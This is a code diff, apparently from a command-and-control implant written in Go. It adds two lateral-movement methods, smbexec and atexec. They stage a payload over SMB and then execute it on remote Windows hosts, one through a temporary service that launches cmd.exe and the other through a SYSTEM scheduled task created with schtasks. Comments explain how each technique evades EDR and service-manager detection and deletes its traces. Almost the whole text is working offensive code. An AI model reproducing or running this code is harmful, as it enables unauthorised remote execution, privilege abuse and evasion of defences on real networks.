@@ -299,6 +299,124 @@ func scpUpload(client *ssh.Client, data []byte, remotePath string) error {
 	return <-errCh
 }
 
+// ── smbExec ───────────────────────────────────────────────────────────────────
+
+// lateralSMBExec stages the payload via SMB then executes it using a temporary
+// service whose binPath is cmd.exe — the service binary itself is never the
+// agent binary. Execution chain: SERVICES.EXE → cmd.exe → agent.exe
+// This extra indirection bypasses EDR rules that flag SERVICES.EXE directly
+// spawning unknown binaries (the classic psexec signature).
+func lateralSMBExec(host string, data []byte, svcName, user, pass string) (string, error) {
+	if svcName == "" {
+		svcName = randSvcName()
+	}
+	exeName := svcName + ".exe"
+
+	lateralAuth(host, user, pass)
+
+	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		return "", fmt.Errorf("smbexec: %w", err)
+	}
+
+	// binPath = cmd.exe acting as the service binary; it launches our agent
+	// and exits, leaving the agent orphaned (detached from SCM).
+	safePath := strings.ReplaceAll(localPath, `"`, `\"`)
+	binPath := fmt.Sprintf(`%s /Q /c start /B "%s"`, `%COMSPEC%`, safePath)
+
+	machineW, _ := windows.UTF16PtrFromString(`\\` + host)
+	scm, _, e := procOpenSCManagerW.Call(
+		uintptr(unsafe.Pointer(machineW)),
+		0,
+		scManagerConnect|scManagerCreateService,
+	)
+	if scm == 0 {
+		return "", fmt.Errorf("smbexec OpenSCManager %s: %w", host, e)
+	}
+	defer procCloseServiceHandleLat.Call(scm)
+
+	svcNameW, _ := windows.UTF16PtrFromString(svcName)
+	binPathW, _ := windows.UTF16PtrFromString(binPath)
+
+	svc, _, e := procCreateServiceW.Call(
+		scm,
+		uintptr(unsafe.Pointer(svcNameW)),
+		uintptr(unsafe.Pointer(svcNameW)),
+		serviceAllAccess,
+		serviceWin32OwnProcess,
+		serviceDemandStart,
+		serviceErrorIgnore,
+		uintptr(unsafe.Pointer(binPathW)),
+		0, 0, 0, 0, 0,
+	)
+	if svc == 0 {
+		return "", fmt.Errorf("smbexec CreateService %s: %w", host, e)
+	}
+	defer procCloseServiceHandleLat.Call(svc)
+
+	r, _, e := procStartServiceW.Call(svc, 0, 0)
+	procDeleteServiceLat.Call(svc)
+	if r == 0 {
+		return "", fmt.Errorf("smbexec StartService %s: %w", host, e)
+	}
+
+	return fmt.Sprintf("[+] smbexec → %s\n    svc : %s\n    path: %s\n    chain: SERVICES.EXE→cmd.exe→agent", host, svcName, localPath), nil
+}
+
+// ── atExec ────────────────────────────────────────────────────────────────────
+
+// lateralATExec stages the payload via SMB then runs it by creating a remote
+// scheduled task via the MS-TSCH protocol (schtasks.exe). The task is created,
+// triggered immediately, and deleted — no persistent artefact is left behind.
+// Execution context: SYSTEM (or specified user), spawned by taskeng.exe/
+// svchost.exe, completely bypassing SCM-based detection.
+func lateralATExec(host string, data []byte, svcName, user, pass string) (string, error) {
+	if svcName == "" {
+		svcName = randSvcName()
+	}
+	exeName := svcName + ".exe"
+
+	lateralAuth(host, user, pass)
+
+	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		return "", fmt.Errorf("atexec: %w", err)
+	}
+
+	// schtasks helper: build command with optional remote creds
+	sch := func(subCmd string) (string, error) {
+		var cmd string
+		if user != "" && pass != "" {
+			cmd = fmt.Sprintf(`schtasks %s /S "%s" /U "%s" /P "%s"`, subCmd, host, user, pass)
+		} else {
+			cmd = fmt.Sprintf(`schtasks %s /S "%s"`, subCmd, host)
+		}
+		return runShell(cmd)
+	}
+
+	taskName := `\` + svcName
+
+	// Create task: run as SYSTEM, one-time, execute immediately via /RUN
+	createArgs := fmt.Sprintf(`/Create /TN "%s" /TR "%s" /SC ONCE /ST 00:00 /RU SYSTEM /F`,
+		taskName, localPath)
+	if out, err := sch(createArgs); err != nil {
+		return out, fmt.Errorf("atexec create task %s: %w", host, err)
+	}
+
+	// Trigger immediately
+	runArgs := fmt.Sprintf(`/Run /TN "%s"`, taskName)
+	out, err := sch(runArgs)
+	if err != nil {
+		sch(fmt.Sprintf(`/Delete /TN "%s" /F`, taskName)) //nolint:errcheck
+		return out, fmt.Errorf("atexec run task %s: %w", host, err)
+	}
+
+	// Clean up — ignore error (task may self-delete after running)
+	sch(fmt.Sprintf(`/Delete /TN "%s" /F`, taskName)) //nolint:errcheck
+
+	return fmt.Sprintf("[+] atexec → %s\n    task: %s\n    path: %s\n    runas: SYSTEM", host, taskName, localPath), nil
+}
+
 // ── DCOM lateral ──────────────────────────────────────────────────────────────
 
 // lateralDCOM stages data via SMB and executes it using DCOM MMC20.Application.
@@ -350,7 +468,11 @@ func runLateral(method, host string, data []byte, svcName, user, pass string) (s
 		return lateralSSH(host, data, svcName, user, pass)
 	case "dcom":
 		return lateralDCOM(host, data, svcName, user, pass)
+	case "smbexec", "smb":
+		return lateralSMBExec(host, data, svcName, user, pass)
+	case "atexec", "at":
+		return lateralATExec(host, data, svcName, user, pass)
 	default:
-		return "", fmt.Errorf("unknown method %q — use psexec, wmi, winrm, ssh, dcom", method)
+		return "", fmt.Errorf("unknown method %q — use psexec|wmi|winrm|ssh|dcom|smbexec|atexec", method)
 	}
 }
